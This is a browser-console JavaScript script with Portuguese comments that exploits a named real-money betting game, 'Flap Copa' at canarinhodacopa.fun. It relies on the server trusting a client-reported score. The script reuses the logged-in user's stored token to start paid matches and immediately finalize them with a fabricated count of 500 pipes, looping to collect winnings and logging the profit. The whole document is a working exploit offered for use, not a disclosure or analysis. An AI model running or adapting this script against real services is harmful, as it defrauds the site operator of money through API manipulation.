// ===============================================================
// AUTO-GANHADOR — Flap Copa (canarinhodacopa.fun)
// Vulnerabilidade: servidor confia no canos_passados enviado pelo cliente
// ===============================================================
// Uso: cole no console do navegador enquanto estiver logado em canarinhodacopa.fun
// ===============================================================

(async function autoGanhador() {
  const token = localStorage.getItem('flappix_token');
  if (!token) return console.error('❌ Token não encontrado. Faça login primeiro.');

  const headers = { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' };
  const APIBASE = '/api/flappybird';

  // === CONFIG ===
  const VALOR_ENTRADA = 5;    // Quanto apostar por rodada (min: 3, max: 100)
  const CANOS_ALVO = 500;     // Quantos canos "passar" (quanto maior, mais lucro)
  const MAX_EXECUCOES = 10;   // Quantas vezes repetir automaticamente

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const format = v => 'R$ ' + Number(v || 0).toLocaleString('pt-BR', { minFrac: 2, maxFrac: 2 });

  // Helper: chamar API
  async function api(method, endpoint, body) {
    const r = await fetch(endpoint, {
      method,
      headers,
      body: body ? JSON.stringify(body) : undefined
    });
    return { status: r.status, data: await r.json() };
  }

  // Helper: ver saldo
  async function saldoAtual() {
    const r = await fetch('/api/user/dashboard', { headers });
    const d = await r.json();
    return d.saldo;
  }

  console.log('========================================');
  console.log('🚀 AUTO-GANHADOR — Flap Copa');
  console.log('========================================');
  console.log(`💰 Saldo inicial: ${format(await saldoAtual())}`);
  console.log(`🎯 Aposta: ${format(VALOR_ENTRADA)}/rodada`);
  console.log(`🏗️  ${CANOS_ALVO} canos por rodada`);
  console.log('========================================\n');

  let totalGanho = 0;
  let executadas = 0;

  for (let i = 0; i < MAX_EXECUCOES; i++) {
    try {
      // Passo 1: Iniciar partida
      const iniciar = await api('POST', APIBASE + '/iniciar', {
        valor_entrada: VALOR_ENTRADA
      });

      if (!iniciar.data?.partida_id) {
        if (iniciar.data?.error?.includes('saldo')) {
          console.log(`⛔ Saldo insuficiente após ${executadas} rodadas.`);
          break;
        }
        console.log(`❌ Erro ao iniciar: ${JSON.stringify(iniciar.data)}`);
        continue;
      }

      const pid = iniciar.data.partida_id;
      const porCano = iniciar.data.valor_por_cano;
      const meta = iniciar.data.canos_para_meta;
      const ganhoEstimado = (CANOS_ALVO * porCano).toFixed(2);

      // Passo 2: Finalizar com canos manipulados
      const finalizar = await api('POST', APIBASE + '/finalizar', {
        partida_id: pid,
        canos_passados: CANOS_ALVO,
        resgatou: true
      });

      if (finalizar.data?.ganhou) {
        executadas++;
        totalGanho += finalizar.data.valor_ganho_ou_perdido;
        const saldo = await saldoAtual();
        const lucro = finalizar.data.valor_ganho_ou_perdido - VALOR_ENTRADA;
        console.log(`✅ #${i+1} | Partida #${pid} | 🏆 GANHOU ${format(finalizar.data.valor_ganho_ou_perdido)} | 💰 ${format(saldo)}`);
      } else {
        console.log(`❌ #${i+1} | Partida #${pid} | Falha: ${JSON.stringify(finalizar.data)}`);
      }

    } catch (e) {
      console.error(`💥 Erro na rodada ${i+1}:`, e.message);
    }

    await sleep(800);
  }

  const saldoFinal = await saldoAtual();
  console.log('\n========================================');
  console.log('📊 RESUMO FINAL');
  console.log('========================================');
  console.log(`💰 Saldo final: ${format(saldoFinal)}`);
  console.log(`💵 Lucro total: ${format(totalGanho - VALOR_ENTRADA * executadas)}`);
  console.log(`🎮 Rodadas vencidas: ${executadas}/${MAX_EXECUCOES}`);
  console.log('========================================');

  return { saldoFinal, totalGanho, executadas };
})();
